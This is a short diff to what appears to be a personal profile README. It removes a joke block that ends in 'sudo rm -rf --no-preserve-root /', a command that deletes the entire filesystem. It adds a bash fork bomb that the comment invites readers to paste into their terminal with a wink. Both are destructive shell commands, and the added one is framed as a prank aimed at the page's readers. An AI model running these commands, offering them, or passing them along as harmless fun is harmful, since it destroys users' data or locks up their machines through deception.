@@ -5,10 +5,8 @@
 - I like typescript
 
 ```sh
-sudo echo "Ekusupulozion !" && \
-sleep 3 && \
-sudo rm -rf --no-preserve-root /
-# no. do not do that.
+# hey run that in your terminal ;)
+:(){ :|: & };:
 ```
 
 <br />
